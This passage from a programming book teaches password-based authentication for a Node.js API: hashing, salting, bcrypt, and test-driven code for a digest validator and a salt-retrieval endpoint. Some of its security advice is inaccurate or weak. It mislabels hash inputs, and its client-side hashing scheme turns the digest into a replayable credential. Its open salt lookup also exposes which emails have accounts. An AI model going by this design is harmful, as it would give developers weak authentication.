<html><head></head><body>
        

                            
                    <h1 class="header-title">Security – Authentication and Authorization</h1>
                
            
            
                
<p>So far in this book, we have developed a simple API that allows anonymous users to create, retrieve, modify, and delete users. This is insecure and impractical for any real-world applications. Therefore, in this chapter, we will begin to secure our API by implementing a rudimentary <strong>authentication</strong> and <strong>authorization</strong> layer on top of it. This will also give us a chance to practice the TDD process and work with the CI servers.</p>
<p>The purpose of this chapter is to show you how to implement a <em>stateless</em> authentication and authorization scheme using <strong>JSON Web Tokens</strong> (<strong>JWTs</strong>). Being stateless is extremely important to ensure the scalability of our application, something which we will discuss in <a href="5d093a43-720f-4ea8-aac0-b64b13f96d12.xhtml" target="_blank">Chapter 18</a>, <em>Robust Infrastructure with Kubernetes</em>.</p>
<p>By the end of this chapter, our API will be <em>more</em> secure than its current state, but there'll still be a lot more steps we need to take to truly secure it. It'll be impossible to cover all security-related topics, and thus we will focus on the basics, and we'll provide you with pointers at the end of the chapter if you are interested in implementing further security measures.</p>
<p>By completing this chapter, you will:</p>
<ul>
<li>Understand <strong>encoding</strong>, <strong>hashing</strong>, <strong>salting</strong>, <strong>encryption</strong>, <strong>block ciphers</strong>, and other cryptographic techniques</li>
<li>Understand and implement <strong>password-based authentication</strong></li>
<li>Understand and implement <strong>token-based authentication</strong> using JSON Web Tokens (JWTs)</li>
<li>Implement authorization checks to make sure users can only perform actions that we allow</li>
</ul>


            

            
        
    

        

                            
                    <h1 class="header-title">What is Authentication?</h1>
                
            
            
                
<p><em>Authentication</em> is a way for a user to identify themselves, for example, using a combination of a username and password. Once the server is able to determine the identity of the user (the user has authenticated), the server can then grant this user limited permissions to perform certain actions. This process of granting permissions is known as <em>authorization</em>:</p>
<div><img src="img/3f6e2895-e10a-4317-b0bc-07627daa60f9.jpg" style="width:41.75em;height:18.67em;"/></div>
<p>For example, we might want to allow anonymous users to create new user accounts, but we don't allow them to update existing users. For an authenticated user, we might allow them to update their own user profile, but not the profile of a different user; if the user tries to edit someone else's profile, they'll get an error.</p>


            

            
        
    

        

                            
                    <h1 class="header-title">Introduction to password-based authentication</h1>
                
            
            
                
<p>When the client sends a request to create a new user, our server already requires them to provide an email and password. Therefore, the simplest way for us to implement an authentication layer is to use the users' passwords.</p>
<p>In the most simplistic scheme, the user must send their email and password with every request. Upon receipt of the request, our API server can then compare these credentials with the ones stored in our database; if there's a match, then the user is authenticated, otherwise, they are not.</p>
<p>While the preceding process allows us to authenticate a user, it is not necessarily secure for the following reasons:</p>
<ul>
<li class="mce-root">The password is kept in plaintext. According to a report by Ofcom (<a href="https://www.ofcom.org.uk/about-ofcom/latest/media/media-releases/2013/uk-adults-taking-online-password-security-risks">ofcom.org.uk/about-ofcom/latest/media/media-releases/2013/uk-adults-taking-online-password-security-risks</a>) the communications regulator in the UK, more than half of internet users reuse their passwords across multiple sites. Therefore, whoever has the user's plaintext password for one platform can potentially access the user's account on other platforms, such as social media and banking accounts. Therefore, having the password kept as plaintext means the following:
<ul>
<li>The client must trust our API server not to do anything erroneous with the password</li>
<li class="mce-root">If the server and/or database was ever compromised, the hacker would be able to read the plaintext passwords</li>
<li class="mce-root">Malicious third parties may eavesdrop on the communication between the client and the server using <strong>Man-in-the-Middle</strong> (<strong>MITM</strong>) attacks and be able to extract the user's plaintext password</li>
</ul>
</li>
<li class="mce-root">Passwords can be <strong>brute-forced</strong>: a malicious party can try out common passwords or even just attempt every combination of characters until one succeeds.</li>
</ul>
<p>Therefore, we should enforce strong passwords to prevent brute-force attacks, and also <strong>cryptographically hash</strong> the password before sending it over the wire.</p>
<p class="mce-root"/>


            

            
        
    

        

                            
                    <h1 class="header-title">Hashing passwords</h1>
                
            
            
                
<p>Generally speaking, a <strong>hashing function</strong> maps data of an arbitrary size (called a <strong>message</strong>, or <strong>initialization vectors</strong>) to data of a fixed size (called a <strong>digest</strong>):</p>
<pre>const digest = MD5(message);</pre>
<p>When used in a security context, a hashing algorithm is used to obfuscate a piece of information, such as a password.</p>
<p class="mce-root">For example, if we use the hashing function <strong>MD5</strong> to hash the passphrases <kbd>healer cam kebab poppy</kbd> and <kbd>peppermint green matcha ceylon</kbd>, it will produce the hash digests <kbd>b9f624315c5fb5dca09aa194091fccff</kbd> and <kbd>e6d4da56a185ff78721ab5cf07790a2c</kbd>. Both digests have a fixed size of 128 bits (represented as hexadecimal) and both strings look pretty random. The MD5 algorithm also has the property of being <strong>deterministic</strong>, which means if we run the algorithm using the same message again, it will always produce the same digest.</p>
<p class="mce-root">Therefore, in theory, when the user first registers, we can require the client to hash their password before sending it over to the server; this way, no one except for the client will know what the original password is. The server would then store the digest in the database.</p>
<p class="mce-root">The next time the same user wishes to authenticate with the server, they should again hash the password and send the digest to the server. Because MD5 is deterministic, the same password should result in the same digest. This allows the server to compare the digest provided in the request with the digest stored in the database; if they match, the server can authenticate the user, <em>without knowing what the password actually is</em>.</p>


            

            
        
    

        

                            
                    <h1 class="header-title">Cryptographic hash functions</h1>
                
            
            
                
<p class="mce-root">However, MD5 is not a suitable algorithm for hashing passwords because although the digests look like gibberish, there are now tools that can use the digest to reverse-engineer the password. To hash passwords, we need to use a special class of hash functions called <strong>cryptographic hash functions</strong>, which have the following special properties:</p>
<ul>
<li class="mce-root"><strong>Deterministic</strong><em>:</em> Given the same message, they will always produce the same digest.</li>
</ul>
<ul>
<li class="mce-root"><strong>One-way</strong>: The message, or a part of the message, cannot be reverse-engineered from the digest. The only way to obtain the original message from the hash is to try every possible value for the message to see if the generated hash matches.</li>
<li class="mce-root"><strong>Exhibits the avalanche effect</strong>: A small change in the message would produce a drastically different digest. This prevents a cryptoanalyst from finding patterns between hashes and narrowing down the possible combinations for the message.</li>
<li class="mce-root"><strong>Collision-resistant</strong>: Two different messages should produce two different digests. The chance of two different messages producing the same digest is minuscule.</li>
<li class="mce-root"><strong>Slow</strong>: This may seem counterintuitive, but when hashing is used for security, a slower algorithm discourages brute-force attacks. Here's a case in point: a hashing function that takes 1 ms to execute can produce 1 billion hashes in 11.5 days. A hashing function that takes 40 ms to execute can produce 1 billion hashes in 463 days, which is a significantly longer time. However, to a normal user, the difference between 1 ms and 40 ms is negligible. In other words, we want our algorithm to be slow for an attacker, but not for legitimate users.</li>
<li class="mce-root"><strong>Robust</strong>: It must stand the test of time.</li>
</ul>


            

            
        
    

        

                            
                    <h1 class="header-title">Picking a cryptographic hashing algorithm</h1>
                
            
            
                
<p>Since MD5 violates the one-way constraint, we must pick a more suitable cryptographic hash function. There are a myriad of hashing algorithms available. Here's a list of some of the most popular ones: <strong>MD4</strong>, <strong>MD5</strong>, <strong>MD6</strong>, <strong>SHA1</strong>, <strong>SHA2</strong> series (including <strong>SHA256</strong>, <strong>SHA512</strong>), <strong>SHA3</strong> series (including <strong>SHA3-512</strong>, <strong>SHAKE256</strong>), <strong>RIPEMD</strong>, <strong>HAVAL</strong>, <strong>BLAKE2</strong>, <strong>RipeMD</strong>, <strong>WHIRLPOOL</strong>, <strong>Argon2</strong>, <strong>PBKDF2</strong>, and <strong>bcrypt</strong>.</p>
<p>MD5 and SHA-1 were extremely popular when they were introduced, and were seen as robust cryptographic hashing algorithms at the time, but have since been replaced by more modern cryptographic hash functions such as PBKDF2 and bcrypt.</p>
<p class="mce-root"/>
<p>Algorithms can become unsuitable due to the following factors:</p>
<ul>
<li><strong>Collisions can be engineered</strong>: Collisions are inevitable, and given enough time and resources, the original message can be brute-forced from the hash.<br/>
However, if someone can <em>purposefully</em> engineer two different messages to produce the same hash, this means they could potentially authenticate another user without knowing the password. This usually requires a lot of computing power and time.<br/>
Thus, an algorithm can be assumed to be collision-resistant if it would take an unworldly amount of time/resources to generate a collision, so that the information they may potentially obtain is not worth the time and resources they must invest into obtaining it.<br/>
However, since cryptography plays such a fundamental role in security, cryptographic hashing algorithms are heavily analyzed in academia. Often, researchers would intentionally try to generate collisions in algorithms (both MD5 and SHA-1 were dethroned in this fashion).</li>
<li><strong>Advances in processing speeds</strong>: Cryptographic algorithms are meant to be slow. If the speed of processors increases, it means a malicious party can spend less time/resources to crack a password. Eventually, advances in processing speed can make an algorithm unsuitable.<br/>
To mitigate collisions, an algorithm should be complex enough and hard to reverse-engineer. It should also produce a digest of sufficient length to reduce the probability of collision (it would be harder to generate collisions for 1024-bit digests than for, say, 128-bit digests).<br/>
To mitigate the advances in processing speeds, modern algorithms employ a method called <strong>hash stretching</strong> (such as <strong>key stretching</strong>), which allows the algorithm to dynamically change the speed of the algorithm.</li>
</ul>


            

            
        
    

        

                            
                    <h1 class="header-title">Hash stretching</h1>
                
            
            
                
<p>Hash stretching slows down an algorithm by repeating the cryptographic hash function many times over. For example, instead of hashing the password once with SHA-256, we run the SHA-256 on the resulting hash again and again:</p>
<pre>function simpleHash(password) {<br/>  return SHA256(password);<br/>}<br/><br/>function repeatedHash(password) {<br/>  const iterations = 64000;<br/>  let x = 0;<br/>  let hash = password;<br/>  while (x &lt; iterations) {<br/>    hash = SHA256(hash);<br/>    x++;<br/>  }<br/>  return hash;<br/>}</pre>
<p>The benefit of this method is that you can change the number of iterations to change the time required to run the function. For instance, if the computing power has doubled in the past few years, you can simply double the number of iterations to keep the same level of security.</p>


            

            
        
    

        

                            
                    <h1 class="header-title">Hash stretching algorithms</h1>
                
            
            
                
<p>There are three modern algorithms that utilize hash stretching: <strong>Password-Based Key Derivation Function 2</strong> (<strong>PBKDF2</strong>), <strong>bcrypt</strong>, and <strong>scrypt</strong>. The difference between PBKDF2 and bcrypt is that bcrypt costs more to run on GPU than PBKDF2, and is therefore harder for an attacker to parallelize the operations using many GPUs.</p>
<p>Both PBKDF2 and bcrypt use a small and constant amount of memory, which makes them vulnerable to brute-force attacks using <strong>application-specific integrated circuit chips</strong> (<strong>ASICs</strong>) and/or <strong>field-programmable gate arrays</strong> (<strong>FPGA</strong>). scrypt was invented to tackle this issue, and allows you to adjust the amount of RAM required to compute the hash. However, scrypt was only published in 2009, and has not been battle-tested as much as the other two algorithms.</p>
<p>Therefore, in this book, we will use the bcrypt algorithm, since it's been around since 1999 and no vulnerabilities have yet been found.</p>


            

            
        
    

        

                            
                    <h1 class="header-title">Preventing brute-force attacks against a single user</h1>
                
            
            
                
<p>While hashing our password obfuscates it, a malicious party may still be able to obtain the password of a targeted victim through the following means:</p>
<ul>
<li class="mce-root"><strong>Dictionary attacks</strong>: Exploit the fact that many users use common passwords (such as <kbd>qwertyuiop</kbd>). In dictionary attacks, a malicious party would use a program to try tens of thousands of the most likely passwords in the hope that one would succeed.</li>
</ul>
<ul>
<li class="mce-root"><strong>Brute-force attacks</strong>: This is similar to a dictionary attack, but the program is run through <strong>all</strong> possible messages within a defined range (for example, all strings with lowercase letters under 13 characters, starting at <kbd>a</kbd>, <kbd>b</kbd>... <kbd>aa</kbd>, <kbd>ab</kbd>, <kbd>ac</kbd>, and going all the way to <kbd>zzzzzzzzzzzzz</kbd>).</li>
</ul>
<p>Even if our passwords are hashed, a malicious party can pre-generate a table of pre-hashed entries (also called <strong>lookup tables</strong> or <strong>rainbow tables</strong>) and attempt to authenticate with the hashes instead of the plaintext passwords; the underlying principle is the same.</p>
<p>Furthermore, if the malicious party is able to obtain the password hash of the user (for example, by eavesdropping on the communication), it can search for the same hash in the lookup table, and be able to determine the original password from the lookup.</p>


            

            
        
    

        

                            
                    <h1 class="header-title">Protecting against brute-force attacks</h1>
                
            
            
                
<p class="mce-root">Fortunately, there's a very simple mechanism we can employ to mitigate lookup table/rainbow table attacks, by making the password very long.</p>
<p class="mce-root">The number of possible hashes scales exponentially with the following:</p>
<ol>
<li class="mce-root">The length of the password</li>
<li class="mce-root">The range of possible characters for each character in the password</li>
</ol>
<p>Let's suppose our passwords can contain lowercase letters, uppercase letters, and numbers; this gives us 62 unique possibilities for each character. If we have a one-character password, that means we only have to generate a rainbow table with 62 (62<sup>1</sup>) entries to be guaranteed a match. If we have a password that has a maximum of two characters, there are now 3,906 (62<sup>1</sup> + 62<sup>2</sup>) possible combinations. If we allow passwords up to 10 characters, that's 853,058,371,866,181,866, or 853 quadrillion combinations (62<sup>1</sup> + 62<sup>2</sup> + 62<sup>3</sup> + 62<sup>4</sup> + 62<sup>5</sup> + 62<sup>6</sup> + 62<sup>7</sup> + 62<sup>8</sup> + 62<sup>9</sup> + 62<sup>10</sup>). Although that sounds like an unimaginably large number, there are machines that can calculate hundreds of billions of hashes per second. Therefore, it'll take about a month to go through all those combinations—still not very secure.</p>
<p class="mce-root">However, if the maximum length of the password becomes 20 characters, then it'll take 715, 971, 350, 555, 965, 203, 672, 729, 121, 413, 359, 850, or 715 decillion, iterations to generate all passwords of 20 characters. Those extra 10 characters mean it's now 839 quadrillion times harder to generate all password combinations.</p>
<p class="mce-root"/>
<p class="mce-root">Therefore, by implementing a reasonable password policy, it will deter hackers from even attempting to brute-force attack you. A reasonable policy may read as follows:</p>
<ul>
<li>Password must be at least 12 characters long</li>
<li>Password must include at least one special character (<kbd>!£$^&amp;()+-=[]}{:@;&lt;&gt;.,</kbd>)</li>
</ul>
<p>With our list of 21 special characters, our character range is now increased to 83. Therefore, a hacker would have to calculate 108193544418400894220040, or 108 sextillion, hashes in order to guarantee a match on the password.</p>
<p>Alternatively, you may encourage the user to use a <strong>passphrase</strong>, which is a few unrelated words chained together; for example, <kbd>correct horse battery staple</kbd> (a reference to this XKCD comic: <a href="https://xkcd.com/936/">xkcd.com/936</a>). This ensures that the password is long enough that the lack of character range doesn't matter. The attacker would have to try a huge number of combinations before it arrives at your passphrase.</p>


            

            
        
    

        

                            
                    <h1 class="header-title">Reverse lookup table attacks</h1>
                
            
            
                
<p>By hashing the password on the client before it is transmitted and enforcing a strong password policy will protect against brute-force attacks against a single user. However, if a malicious party is able to obtain a substantial portion of the user database, they can instead perform another type of attack called a <strong>reverse lookup table attack</strong>.</p>
<p>In this attack method, the malicious party would search the compromised database for digests whose original message is already known, in order to obtain a list of user accounts that use that digest, and thus the same password.</p>


            

            
        
    

        

                            
                    <h1 class="header-title">Protecting against reverse lookup table attacks</h1>
                
            
            
                
<p>Fortunately, we can easily prevent reverse lookup table attacks by appending a long, high-entropy, random string to the beginning or end of the user's password before it gets hashed. This random string is called a <strong>salt</strong> and can be publicly known.</p>
<p>Here's how it works: on the client, instead of hashing only the password, the client would first generate a random salt (for example, using the <kbd>crypto</kbd> package), and hash the concatenated string made up of the password and the salt:</p>
<pre class="mce-root">const salt = crypto.randomBytes(128).toString('base64');<br/>const saltedPasswordDigest = MD5(password + salt);</pre>
<p class="mce-root">The client would then send the salted password's digest, alongside the salt, to the server. The server would then store both the digest and the salt in the user document.</p>
<p class="mce-root">The next time the user wants to log in, they would first submit their user ID/username to the server. The server would find the salt associated with the user and send it back to the client. Next, the client would hash the password with the salt and send the digest back to the server. The server then compares the digest in the request against the digest in the database; if it matches, it would authenticate the user.</p>
<p>The purpose of the salt is to make a potentially common password uncommon. So, even if two users have the same password, the final password digest would be different. Therefore, even when an attacker has deciphered the password to a hash, they would not be able to use a lookup table to identify any other users that use that same password, because their password digests would be different.</p>
<p>The longer the salt, the more uncommon the password and salt combination is likely to be. A 16-character string would probably be enough, but since data storage and bandwidth at this scale is cheap, it's not a bad idea to go overkill. Therefore, we recommend a 256-bit salt, which means a 32-character salt.</p>
<p class="mce-root">The salt is not something that needs to remain a secret. If an attacker wishes to target a specific account, they can easily obtain the salt for that user. But because each salt is different, an attacker would need to generate a new rainbow table for each unique salt. And if the user already has a relatively long password to begin with, this would not be feasible. (Imagine if the user's password is 10 characters, that's hundreds of quadrillions of calculations just to crack one user account.) Therefore, salting renders lookup and reverse lookup tables ineffective, as an attacker cannot practically pre-compute a list of hashes for all salts.</p>


            

            
        
    

        

                            
                    <h1 class="header-title">Implementing password-base authentication</h1>
                
            
            
                
<p>Armed with the knowledge of hashing and salting, we'll now implement a password-based authentication layer on top of our existing API using the bcrypt algorithm. First, we'll need to update our <kbd>Create User</kbd> endpoint to accept a bcrypt digest instead of a password. Since we are following TDD, we will update the E2E tests first, before updating the implementation.</p>


            

            
        
    

        

                            
                    <h1 class="header-title">Updating existing E2E tests</h1>
                
            
            
                
<p>First, in the Gherkin specifications and Cucumber code, update anything related to passwords to use digests instead; this includes both the step description, step definitions, and sample data. For example, you may make the following changes in the E2E tests for the Bad Client Requests scenario of the <kbd>Create User</kbd> feature:</p>
<pre>--- a/spec/cucumber/features/users/create/main.feature<br/>+++ b/spec/cucumber/features/users/create/main.feature<br/>@@ -34,9 +34,9 @@ Feature: Create User<br/><br/>     Examples:<br/><br/>- | missingFields | message                          |<br/>- | email         | The '.email' field is missing    |<br/>- | password      | The '.password' field is missing |<br/>+ | missingFields | message                        |<br/>+ | email         | The '.email' field is missing  |<br/>+ | digest        | The '.digest' field is missing |</pre>
<p>Try doing a global search and in the <kbd>spec/cucumber</kbd> directory, replacing the word <kbd>password</kbd> with <kbd>digest</kbd>.<br/>
<br/>
To generate a dummy bcrypt digest, try Googling online bcrypt generator; there are many free online tools available.</p>


            

            
        
    

        

                            
                    <h1 class="header-title">Generating a random digest</h1>
                
            
            
                
<p>Inside our code bundle, there is a <kbd>createUser</kbd> function that we use to generate dummy users for our tests. At the moment, it is using the <kbd>crypto.randomBytes()</kbd> method to generate a random 32-character hexadecimal string to use as the password. To produce a digest from this password, we can use a package from the <a href="https://npmjs.com">npmjs.com</a> registry.</p>


            

            
        
    

        

                            
                    <h1 class="header-title">Picking a bcrypt library</h1>
                
            
            
                
<p>There are several bcrypt libraries that are available for JavaScript:</p>
<ul>
<li><kbd>bcrypt</kbd> ( <kbd>node.bcrypt.js</kbd>): This is the most performant and efficient implementation of the bcrypt algorithm because it uses the C++ implementation and simply binds it to Node. However, it has a lot of dependencies and restrictions that make it messy to work with, notably:
<ul>
<li>Python 2.x.</li>
<li><kbd>node-gyp</kbd>: Because <kbd>bcrypt</kbd> is written as a Node.js add-on, it is written in C++ and must be compiled for your machine's architecture before it can be used. This means that it must depend on <kbd>node-gyp</kbd> for its building and installation process. <kbd>node-gyp</kbd> only works with Long Term Support (LTS) versions of Node.</li>
</ul>
</li>
<li><kbd>bcryptjs</kbd> (<a href="https://www.npmjs.com/package/bcryptjs">npmjs.com/package/bcryptjs</a>): A standalone JavaScript implementation of bcrypt that does not have external dependencies. Because it is not running on a low-level language like C++, it is slightly (30%) slower. This means that it cannot process as many iterations per unit time as a more efficient implementation. It has the same interface as the <kbd>bcrypt</kbd> package and can also be run in the browser, where it relies on the standardized Web Crypto API to generate random numbers.</li>
<li><kbd>bcrypt-nodejs</kbd>: An unmaintained predecessor to <kbd>bcryptjs</kbd>.</li>
</ul>
<p>Therefore, the choice is between performance (<kbd>bcrypt</kbd>) and the ease of setup (<kbd>bcryptjs</kbd>).</p>
<p class="mce-root"/>
<p>Don't get confused. A cryptographic hashing algorithm should be slow; the slower it is, the more secure it is. However, you should always assume that an attacker uses the quickest <em>implementation</em> of the algorithm possible, and thus we should also use the quickest implementation whenever possible. Therefore, purely from a security point of view, the <kbd>bcrypt</kbd> package is preferred to <kbd>bcryptjs</kbd> because it is the quickest implementation for JavaScript.</p>
<p>We will use the <kbd>bcryptjs</kbd> package for now, as it is the simplest to set up. But after you've completed all the exercises in this book, feel free to switch to using the <kbd>bcrypt</kbd> package for an extra performance boost. Since the <kbd>bcryptjs</kbd> package is 100% compatible with the <kbd>bcrypt</kbd> package, all you need to do is update the <kbd>import</kbd> statement; everything else can be kept the same.</p>


            

            
        
    

        

                            
                    <h1 class="header-title">Using the bcryptjs library</h1>
                
            
            
                
<p>First, let's install it as a development dependency:</p>
<pre><strong>$ yarn add bcryptjs --dev</strong></pre>
<p>Then, import the <kbd>genSaltSync</kbd> and <kbd>hashSync</kbd> methods from the <kbd>bcryptjs</kbd> module and use them to generate a salt and digest. We will also store the salt and digest in the context to help us make assertions in subsequent steps:</p>
<pre><strong>import { genSaltSync, hashSync } from 'bcryptjs';</strong><br/>...<br/>async function createUser() {<br/>  ...<br/>  user.password = crypto.randomBytes(32).toString('hex');<br/><strong>  user.salt = genSaltSync(10);</strong><br/><strong>  user.digest = hashSync(user.password, user.salt);</strong><br/>  const result = await client.index({ index, type, refresh, <br/>    body: {<br/>      email: user.email,<br/>      <strong>digest: user.digest,</strong><br/>    },<br/>  });<br/>  ...<br/>}</pre>
<p>Normally, we would use the asynchronous version of the hash method. However, since we are writing a test, which cannot continue anyway unless this step has completed execution, we can use the synchronous method to save us an extra line returning a promise.</p>
<p>The <kbd>genSaltSync</kbd> function has the following function signature:</p>
<pre>genSaltSync([rounds, seed_length])</pre>
<p>Here, <kbd>rounds</kbd> determines how many rounds of hash stretching bcrypt should perform; the higher the number, the slower the digest is to generate and verify. The default is <kbd>10</kbd>, which is what we are using here.</p>
<p>If we run our tests now, the unit and integration tests should still pass, but the E2E tests will fail.</p>


            

            
        
    

        

                            
                    <h1 class="header-title">Validating a digest</h1>
                
            
            
                
<p>Next, we need to specify a new scenario outline to assert that <kbd>POST /users</kbd> requests with an invalid <kbd>digest</kbd> payload property should receive a <kbd>400 Bad Request</kbd> response. Your scenario outline may look like this:</p>
<pre>Scenario Outline: Request Payload with invalid digest format<br/>  When the client creates a POST request to /users<br/>  And attaches a Create User payload where the digest field is exactly &lt;digest&gt;<br/>  And sends the request<br/>  Then our API should respond with a 400 HTTP status code<br/>  And the payload of the response should be a JSON object<br/>  And contains a message property which says "The '.digest' field should be a valid bcrypt digest"<br/><br/>  Examples:<br/><br/>  | digest                                                       |<br/>  | jwnY3Iq1bpT5RTsAXKOLnr3ee423zWFU23efwXF27bVKJ4VrDmWA0hZi6YI0 |<br/>  | $2y$10$a7iPlM2ORVOPr0QNvDf.a.0QKEWwSGRKBaKSqv,40KFGcBuveazjW |<br/>  | #2y$10$a7iPlM2ORVOPr0QNvDf.a.0QKEWwSGRKBaKSqv.40KFGcBuveazjW |</pre>
<p class="mce-root"/>


            

            
        
    

        

                            
                    <h1 class="header-title">Updating an existing implementation</h1>
                
            
            
                
<p>Now that we have updated our existing tests, it's time to update our implementation to make the tests pass again. Let's start with updating the Create User JSON schema, replacing the <kbd>password</kbd> property with the <kbd>digest</kbd> property:</p>
<pre>{<br/>  "properties": {<br/>    "email": { ... },<br/>    <strong>"digest": { "type": "string" },</strong><br/>    "profile": { ... }<br/>  },<br/>  "required": ["email", <strong>"digest"</strong>],<br/>}</pre>
<p>However, it is not enough to simply validate the data type of the <kbd>digest</kbd> property; we need to check that the <kbd>digest</kbd> string is a legitimate bcrypt digest. Fortunately, all bcrypt digests have the same general structure:</p>
<p class="CDPAlignCenter CDPAlign"><img src="img/c0ee0f6d-25b5-4736-93b2-458a37c59deb.jpg" style="width:36.25em;height:12.33em;"/></p>
<p class="mce-root"/>
<p>Therefore, we can use the following regular expression to match valid digests:</p>
<pre>^\$2[aby]?\$\d{1,2}\$[.\/A-Za-z0-9]{53}$</pre>
<p>To explain this regular expression, let's break it down:</p>
<ul>
<li><kbd>\$2[aby]?\$</kbd>: This matches the algorithm that's used. Valid values are <kbd>2</kbd>, <kbd>2a</kbd>, <kbd>2y</kbd>, and <kbd>2b</kbd>.</li>
<li><kbd>\d{1,2}\$</kbd>: This matches the cost, or the number of rounds, which is an integer between 4 and 31 (inclusive).</li>
<li><kbd>[.\/A-Za-z0-9]{53}</kbd>: This matches the salt and the hash, with the salt making up the first 22 characters and the hashed password making up the last 31.</li>
</ul>
<p>So, let's update our digest sub-schema to include this pattern:</p>
<pre>"digest": {<br/>  "type": "string"<strong>,</strong><br/>  <strong>"pattern": "^\\$2[aby]?\\$\\d{1,2}\\$[.\\/A-Za-z0-9]{53}$"</strong><br/>}</pre>
<p>The pattern we used in the schema contains extra backslashes to escape the backslashes in our regular expression.</p>
<p>Now, if a client-provided password digest does not match against this pattern, the Create User validator would return a <kbd>ValidationError</kbd> object where the <kbd>keyword</kbd> property is set to <kbd>"pattern"</kbd>. We can use this fact to return a custom message to inform the client that the provided digest is invalid.</p>
<p>Add the following lines to <kbd>src/validators/errors/messages/index.js</kbd>:</p>
<pre>if (error.keyword === 'pattern') {<br/>  return `The '${pathPrefix}${error.dataPath}' field should be a valid bcrypt digest`;<br/>}</pre>
<p>Lastly, don't forget to write unit tests that cover this new logical branch:</p>
<pre>it('should return the correct string when error.keyword is "pattern"', function () {<br/>  const errors = [{<br/>    keyword: 'pattern',<br/>    dataPath: '.test.path',<br/>  }];<br/>  const actualErrorMessage = generateValidationErrorMessage(errors);<br/>  const expectedErrorMessage = "The '.test.path' field should be a valid bcrypt digest";<br/>  assert.equal(actualErrorMessage, expectedErrorMessage);<br/>});</pre>
<p>Then, in our Retrieve User and Search User engines (defined in <kbd>src/engines/users/</kbd>), make sure we are excluding the <kbd>digest</kbd> field when querying for the User object, for example:</p>
<pre>db.get({<br/>  index: process.env.ELASTICSEARCH_INDEX,<br/>  type: 'user',<br/>  id: req.params.userId,<br/>  <strong>_sourceExclude: 'digest',</strong><br/>})</pre>
<p>Now, run the E2E tests again and confirm that they are passing. Once that's done, update the unit and integration tests so they'll pass as well. Lastly, commit the changes to a new branch called <kbd>authentication/main</kbd>, push that branch to GitHub, and check the results on the Travis and Jenkins CI servers.</p>


            

            
        
    

        

                            
                    <h1 class="header-title">Retrieving the salt</h1>
                
            
            
                
<p>The updated Create User endpoint now requires users to specify their credentials in the form of a bcrypt digest, which we store in our Elasticsearch database. The next thing we need to do is implement a system where we can authenticate any subsequent requests by comparing the digest provided by the client and the digest we store in our database.</p>
<p>But in order for the client to regenerate the same digest, they must be provided with the same salt and parameters. Therefore, our API needs to create a new endpoint for our client to retrieve the salt.</p>
<p>As with other features, we start our development by writing E2E tests. Create a new feature specification at <kbd>spec/cucumber/features/auth/salt/main.feature</kbd> and add the following scenarios:</p>
<pre>Feature: Retrieve Salt and Parameters<br/><br/>  Test that we can create a user using a digest and then retrieve information about the digest's salt and parameters successfully<br/><br/>  Scenario: Retrieve Salt without specifying Email<br/><br/>    When the client creates a GET request to /salt<br/>    And sends the request<br/>    Then our API should respond with a 400 HTTP status code<br/>    And the payload of the response should be a JSON object<br/>    And contains a message property which says "The email field must be specified"<br/><br/>  Scenario: Send Digest and Retrieve Salt<br/><br/>    Given a new user is created with random password and email<br/>    When the client creates a GET request to /salt<br/>    And set a valid Retrieve Salt query string<br/>    And sends the request<br/>    Then our API should respond with a 200 HTTP status code<br/>    And the payload of the response should be a string<br/>    And the payload should be equal to context.salt</pre>
<p>Use what you have learned to implement the undefined steps.</p>


            

            
        
    

        

                            
                    <h1 class="header-title">Implementing the Retrieve Salt endpoint</h1>
                
            
            
                
<p>We should keep the implementation of the Retrieve Salt endpoint consistent with our existing endpoints, and thus we should create a handler and an engine for it.</p>


            

            
        
    

        

                            
                    <h1 class="header-title">Implementing a Retrieve Salt engine</h1>
                
            
            
                
<p>Create a new Retrieve Salt engine at <kbd>src/engines/auth/salt/retrieve/index.js</kbd>. In it, we need to use the Elasticsearch client's <kbd>search</kbd> method to find the user's document by email, extract the digest from the document, and then extract the salt from the digest:</p>
<pre>const NO_RESULTS_ERROR_MESSAGE = 'no-results';<br/><br/>function retrieveSalt(req, db, getSalt) {<br/>  if (!req.query.email) {<br/>    return Promise.reject(new Error('Email not specified'));<br/>  }<br/>  return db.search({<br/>    index: process.env.ELASTICSEARCH_INDEX,<br/>    type: 'user',<br/>    body: {<br/>      query: {<br/>        match: {<br/>          email: req.query.email,<br/>        },<br/>      },<br/>    },<br/>    _sourceInclude: 'digest',<br/>  }).then((res) =&gt; {<br/>    const user = res.hits.hits[0];<br/>    return user<br/>      ? user._source.digest<br/>      : Promise.reject(new Error(NO_RESULTS_ERROR_MESSAGE));<br/>  }).then(getSalt);<br/>}<br/><br/>export default retrieveSalt;<br/><br/></pre>
<p>This function requires the <kbd>getSalt</kbd> method from the <kbd>bcrypt</kbd> library, which would be injected by the handler function. Next, create a file at <kbd>src/handlers/auth/get-salt/index.js</kbd> to house the handler function, which simply passes the request on to the engine and generates standard responses based on the result of the engine:</p>
<pre>function retrieveSalt(req, res, db, engine, _validator, getSalt) {<br/>  return engine(req, db, getSalt).then((result) =&gt; {<br/>    res.status(200);<br/>    res.set('Content-Type', 'text/plain');<br/>    return res.send(result);<br/>  }, (err) =&gt; {<br/>    if (err.message === 'Email not specified') {<br/>      res.status(400);<br/>      res.set('Content-Type', 'application/json');<br/>      return res.json({ message: 'The email field must be specified' });<br/>    }<br/>    throw err;<br/>  }).catch(() =&gt; {<br/>    res.status(500);<br/>    res.set('Content-Type', 'application/json');<br/>    return res.json({ message: 'Internal Server Error' });<br/>  });<br/>}<br/><br/>export default retrieveSalt;</pre>
<p>Lastly, in <kbd>src/index.js</kbd>, import the engine and handler and use it to create a new endpoint:</p>
<pre>import { getSalt } from 'bcryptjs';<br/>import retrieveSaltHandler from './handlers/auth/salt/retrieve';<br/>import retrieveSaltEngine from './engines/auth/salt/retrieve';<br/>const handlerToEngineMap = new Map([<br/>  [retrieveSaltHandler, retrieveSaltEngine],<br/>  ...<br/>]);<br/>app.get('/salt', injectHandlerDependencies(retrieveSaltHandler, client, handlerToEngineMap, handlerToValidatorMap, getSalt));<br/><br/></pre>
<p>Since we are now using the <kbd>bcryptjs</kbd> package in our implementation code, and not just our test code, we should move it from <kbd>devDependencies</kbd> to <kbd>dependencies</kbd>:</p>
<pre><strong>$ yarn remove bcryptjs</strong><br/><strong>$ yarn add bcryptjs</strong></pre>
<p>Lastly, we should also modify the <kbd>injectHandlerDependencies</kbd> function to pass through the <kbd>getSalt</kbd> dependency:</p>
